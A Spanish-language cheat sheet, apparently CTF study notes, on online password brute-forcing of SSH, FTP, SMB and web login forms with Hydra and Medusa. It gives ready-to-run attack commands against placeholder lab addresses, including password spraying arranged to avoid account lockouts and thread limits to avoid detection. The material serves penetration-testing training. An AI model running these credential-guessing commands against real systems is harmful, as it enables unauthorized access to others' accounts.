# Fuerza Bruta Online (Servicios y Web)

---

## Herramienta Principal: Hydra (El Estándar)

**Objetivo:** Obtener acceso a un servicio activo (SSH, FTP, SMB) o panel web probando credenciales directamente contra el servidor. Es rápida, versátil y la herramienta reina en CTFs.
**Sintaxis Básica (Servicios):** `hydra [Banderas_Credenciales] [IP_Víctima] [Protocolo]`
**Sintaxis Básica (Web):** `hydra [Banderas_Credenciales] [IP_Víctima] http-post-form "[Ruta]:[Parámetros]:[Mensaje_Error]"`

### Banderas Clave de Hydra
El éxito con Hydra depende estrictamente de no confundir mayúsculas y minúsculas:
*   `-l` (minúscula): **L**ogin específico (Ej: `-l admin`).
*   `-L` (mayúscula): **L**ista de Logins (Ej: `-L usuarios.txt`).
*   `-p` (minúscula): **P**assword específico (Ej: `-p admin123`).
*   `-P` (mayúscula): **P**assword Lista (Ej: `-P /usr/share/wordlists/rockyou.txt`).
*   `-s`: Puerto personalizado (Si el servicio SSH está en el 2222, usas `-s 2222`).

### Comandos Tácticos (CTF)

**1. Ataque SSH (Usuario conocido, lista de contraseñas):**
`hydra -l john -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.X`

**2. Ataque FTP (Password Spraying - Lista de usuarios, 1 contraseña conocida):**
`hydra -L users.txt -p "SuperSecret123" ftp://10.10.10.X`

**3. Ataque Web (Formularios POST):**
*(Requiere la ruta, los campos inyectando `^USER^` y `^PASS^`, y el mensaje de fallo exacto).*
`hydra -l admin -P rockyou.txt 10.10.10.X http-post-form "/login.php:user=^USER^&pass=^PASS^:Fallo el inicio de sesion"`

**4. Ataque Sigiloso (Password Spraying / Alternar Usuarios):** *Si tienes una lista de usuarios y una lista de contraseñas, por defecto Hydra prueba todas las contraseñas en el primer usuario (lo que causa bloqueos de cuenta). Para evitarlo, usamos la bandera `-u` (minúscula) que invierte el bucle: prueba 1 contraseña en todos los usuarios, y luego pasa a la siguiente.* 
* **Comando:** `hydra -L usuarios.txt -P rockyou.txt ssh://10.10.10.X -u -t 4` 
* **Cómo funciona:** 
	Intento 1: user1 : password_A 
	Intento 2: user2 : password_A 
	Intento 3: user1 : password_B 
	Intento 4: user2 : password_B

### Optimización para CTFs (Prevención de Errores)
Si atacas muy rápido, los servicios de red modernos (especialmente SSH) se protegerán y rechazarán tus conexiones, arrojando falsos negativos.
*   `-t 4`: Tareas Paralelas (Hilos). Para SSH, **nunca uses más de 4 hilos**.
*   `-V`: Verbose. Muestra cada intento en tiempo real en la pantalla.
*   `-f`: Exit on First. ¡Vital! Se detiene automáticamente en cuanto encuentra una credencial válida, ahorrando tiempo y ruido.

**El Comando Perfecto (Ejemplo SSH seguro y rápido):**
`hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.X -t 4 -V -f`

---

## Alternativa: Medusa (El Plan B)

**Objetivo:** Herramienta de fuerza bruta paralela. Es la alternativa directa cuando Hydra falla, da falsos positivos o causa errores de "Connection Refused".
**Sintaxis Principal:** `medusa -h [IP] -u [Usuario] -P [Diccionario] -M [Protocolo]`

### Banderas Clave de Medusa
A diferencia de Hydra, Medusa requiere que el objetivo y el módulo se definan con banderas.
*   `-h`: IP del objetivo (Host).
*   `-u` / `-U`: Usuario único (`-u admin`) / Lista de usuarios (`-U users.txt`).
*   `-p` / `-P`: Clave única (`-p admin123`) / Lista de claves (`-P rockyou.txt`).
*   `-M`: Módulo a utilizar (ej. `ssh`, `ftp`, `smb`, `mysql`).
*   `-n`: Puerto personalizado (Si el SSH no está en el 22, usas `-n 2222`).

### Comandos Tácticos (CTF)

**1. Ataque SSH (Usuario conocido, lista de contraseñas):**
`medusa -h 10.10.10.X -u admin -P /usr/share/wordlists/rockyou.txt -M ssh`

**2. Ataque FTP (Lista de usuarios, lista de contraseñas):**
`medusa -h 10.10.10.X -U usuarios.txt -P passwords.txt -M ftp`

**3. Ataque SMB (Carpetas compartidas de Windows):**
`medusa -h 10.10.10.X -u Administrator -P rockyou.txt -M smbnt`

### Optimización para CTFs
*   `-O [archivo.txt]` -> Guarda los resultados exitosos en un archivo (ideal para no perder la contraseña si limpias la terminal).
*   `-b` -> Suprime el banner gigante del inicio (hace que arranque un poco más rápido y limpia la pantalla).
*   `-t` -> Cantidad de hilos concurrentes (por defecto es estable, pero puedes limitarlo con `-t 4` si el servidor es muy inestable).

**El Comando Perfecto (Ejemplo SSH rápido y limpio):**
`medusa -h 10.10.10.X -u john -P rockyou.txt -M ssh -b -O credenciales_exito.txt`